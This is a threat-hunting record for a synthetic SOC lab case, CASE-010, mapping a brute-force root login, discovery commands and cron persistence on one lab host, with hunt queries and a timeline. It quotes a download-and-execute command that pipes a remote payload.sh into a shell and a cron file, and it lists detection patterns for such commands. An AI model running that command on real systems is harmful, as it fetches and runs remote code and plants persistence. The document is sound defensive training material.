# CASE-010 — Threat Hunting Record

## 1. Purpose

This document records threat-hunting activities and investigative queries relevant to CASE-010.

The hunts are designed for the synthetic SOC laboratory telemetry associated with the multi-stage attack scenario.

Hunting activities described as recommended or defined below must not be interpreted as executed unless an execution result is explicitly recorded.

## 2. Hunting Objectives

The investigation focuses on identifying:

1. related authentication activity;
2. source IP reuse;
3. activity involving the affected host;
4. activity involving the privileged user;
5. post-authentication discovery commands;
6. cron persistence activity;
7. download-and-execute command patterns;
8. related persistence locations;
9. additional events outside the correlated alert; and
10. benign administrative activity that could generate similar detections.

## 3. Primary Investigation Pivots

| Pivot                       | Value                       |
| --------------------------- | --------------------------- |
| Source IP                   | `198.51.100.90`             |
| Host                        | `lab-linux-10`              |
| User                        | `root`                      |
| Session                     | `SES-010-A`                 |
| Persistence path            | `/etc/cron.d/system-update` |
| Download endpoint reference | `203.0.113.80`              |
| Download resource           | `/payload.sh`               |
| Correlation detection       | `DET-CORR-001`              |

These pivots are derived from the synthetic CASE-010 evidence.

## 4. Authentication Hunt

### Objective

Identify all authentication events associated with the source IP and target user.

### Query Concept

```text
event_type = authentication
AND source_ip = 198.51.100.90
AND user = root
```

### Expected Investigation

The hunt should identify:

* six failed authentication events;
* one successful authentication event;
* the transition from repeated failures to successful authentication;
* event timestamps;
* source IP;
* target user; and
* supporting event identifiers.

### CASE-010 Evidence

The relevant events are:

```text
EVT-010001
EVT-010002
EVT-010003
EVT-010004
EVT-010005
EVT-010006
EVT-010007
```

These events form the authentication portion of the scenario.

## 5. Source-IP Expansion Hunt

### Objective

Determine whether the source address appears elsewhere in the available telemetry.

### Query Concept

```text
source_ip = 198.51.100.90
```

### Questions

An analyst should determine:

* which hosts received activity from the source;
* which users were targeted;
* whether additional authentication failures occurred;
* whether successful authentication occurred elsewhere;
* whether the source interacted with other services; and
* whether activity continued after the CASE-010 sequence.

### Current Evidence Limitation

The supplied CASE-010 telemetry represents a single laboratory host.

Therefore, the available case evidence does not establish activity against additional hosts.

## 6. Privileged-User Hunt

### Objective

Identify activity associated with the `root` account on the affected host.

### Query Concept

```text
host = lab-linux-10
AND user = root
```

### Expected Investigation

The hunt should identify:

* authentication activity;
* session establishment;
* commands;
* persistence activity; and
* other events associated with the account.

### Observed CASE-010 Activity

The relevant post-authentication events include:

```text
EVT-010008
EVT-010009
EVT-010010
EVT-010011
EVT-010012
EVT-010013
```

## 7. Session Hunt

### Objective

Reconstruct the activity associated with session `SES-010-A`.

### Query Concept

```text
session_id = SES-010-A
```

### Observed Commands

```text
whoami
id
sudo -l
uname -a
```

The commands provide account, identity/group, privilege, and system-information discovery context.

They are not inherently malicious.

## 8. Cron Persistence Hunt

### Objective

Identify Linux persistence activity involving cron locations.

### Query Concept

```text
event_type = linux_persistence
AND file_path starts_with cron persistence location
```

Relevant persistence locations include:

```text
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/var/spool/cron/
/var/spool/cron/crontabs/
```

### CASE-010 Evidence

The suspicious persistence event is:

```text
EVT-010013
```

with:

```text
file_path = /etc/cron.d/system-update
```

The event contains multiple suspicious indicators and triggered `DET-LINUX-001`.

## 9. Download-and-Execute Hunt

### Objective

Identify command lines combining network retrieval and shell execution.

### Query Concept

```text
command_line contains curl
OR command_line contains wget
```

followed by investigation of shell execution patterns such as:

```text
| sh
| bash
```

### CASE-010 Evidence

The relevant command is:

```text
curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update
```

This command combines:

1. network resource retrieval;
2. shell execution; and
3. redirection into a cron persistence location.

The telemetry does not independently prove that the network request succeeded or that the downloaded content was malicious.

## 10. Persistence-Path Expansion Hunt

### Objective

Identify additional cron persistence activity on the affected host.

### Query Concept

```text
host = lab-linux-10
AND event_type = linux_persistence
```

### CASE-010 Results Represented in Telemetry

The available persistence events are:

```text
EVT-010013
EVT-010014
```

`EVT-010013` contains the suspicious persistence indicators.

`EVT-010014` represents benign administrative activity:

```text
crontab -e
```

The benign event is important because it demonstrates that cron-related activity alone should not automatically be treated as malicious.

## 11. Command-Line Hunt

### Objective

Identify discovery and privilege-related commands associated with the affected host.

### Query Concept

```text
host = lab-linux-10
AND event_type = process_execution
```

### Relevant Commands

```text
whoami
id
sudo -l
uname -a
```

These commands should be evaluated in context rather than independently classified as malicious.

Their significance increases because they occur after the successful authentication event and before the suspicious persistence event.

## 12. Timeline Expansion Hunt

### Objective

Determine whether related activity exists immediately before or after the correlated sequence.

### Correlation Window

```text
30 minutes
```

### Observed Sequence

```text
10:00:01–10:01:25
Authentication failures

10:02:03
Successful authentication

10:02:08
Session established

10:02:24–10:03:21
Discovery and privilege-related commands

10:12:00
Suspicious cron persistence

10:14:00
Benign crontab administration
```

The correlated attack sequence spans approximately ten minutes from the successful authentication event to the persistence event.

The benign event occurs after the persistence alert and is not included in the correlated three-stage sequence.

## 13. Detection-Driven Hunt

### Objective

Use each detection as an investigation pivot.

| Detection       | Hunting Pivot                                          |
| --------------- | ------------------------------------------------------ |
| `DET-AUTH-001`  | Source IP, target user, authentication failures        |
| `DET-AUTH-003`  | Session, successful authentication, post-auth commands |
| `DET-LINUX-001` | Cron path, command line, persistence indicators        |
| `DET-CORR-001`  | Host, user, chronological multi-stage sequence         |

This approach allows analysts to move from an alert to broader context rather than investigating each alert in isolation.

## 14. Hunt for Related Authentication Attempts

A broader investigation should search for:

```text
source_ip = 198.51.100.90
```

across all available authentication telemetry.

Additional questions include:

* Was another username targeted?
* Were other hosts targeted?
* Were additional successful authentications observed?
* Did authentication continue after `EVT-010007`?
* Were failed attempts distributed over a longer period?

The current synthetic dataset does not provide evidence for activity outside the supplied CASE-010 events.

## 15. Hunt for Persistence Variants

An analyst should search for additional suspicious persistence indicators, including:

```text
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/var/spool/cron/
/var/spool/cron/crontabs/
```

and command patterns involving:

```text
curl
wget
| sh
| bash
```

Temporary or hidden payload indicators should also be investigated:

```text
/tmp/
/var/tmp/
/dev/shm/
```

These patterns should be combined with contextual evidence to reduce false positives.

## 16. Hunt for Benign Administrative Activity

A mature SOC hunt must include legitimate activity as a control.

CASE-010 contains:

```text
EVT-010014
```

with:

```text
action = cron_edit
command_line = crontab -e
```

This event demonstrates that an administrator may legitimately modify scheduled tasks.

The presence of cron activity alone is therefore insufficient to classify an event as malicious.

## 17. Hunt Status

### Defined Hunts

The following hunts are defined for this case:

* authentication activity;
* source-IP expansion;
* privileged-user activity;
* session activity;
* cron persistence;
* download-and-execute patterns;
* persistence-path expansion;
* command-line discovery;
* timeline expansion;
* detection-driven correlation;
* related authentication attempts;
* persistence variants; and
* benign administrative activity.

### Execution Status

The hunt definitions above document investigation logic and expected pivots.

They do not claim that external enterprise telemetry or additional hosts were searched.

The case evidence is limited to the supplied synthetic CASE-010 telemetry.

## 18. Hunting Limitations

The current hunting scope is limited by:

* synthetic telemetry;
* a single laboratory host;
* a finite event set;
* no enterprise-wide log source;
* no external network telemetry;
* no DNS telemetry;
* no proxy telemetry;
* no endpoint detection platform;
* no real threat-intelligence feeds; and
* no evidence outside the supplied scenario.

These limitations prevent conclusions about activity beyond the laboratory dataset.

## 19. Hunting-to-Investigation Relationship

The hunting workflow is:

```text
Detection
   ↓
Primary pivot
   ↓
Related-event search
   ↓
Timeline expansion
   ↓
Benign-control comparison
   ↓
Evidence validation
   ↓
Investigation conclusion
```

This workflow helps prevent premature conclusions based on a single alert.

## 20. Analyst Conclusion

The defined hunts support reconstruction of the CASE-010 sequence from authentication activity through post-authentication activity and suspicious Linux persistence.

The strongest observed relationship is the common:

```text
source IP → user → host → session → commands → persistence
```

The available evidence supports continued investigation of a multi-stage attack sequence.

It does not independently establish attacker identity, malicious payload contents, successful persistence execution, or confirmed compromise.
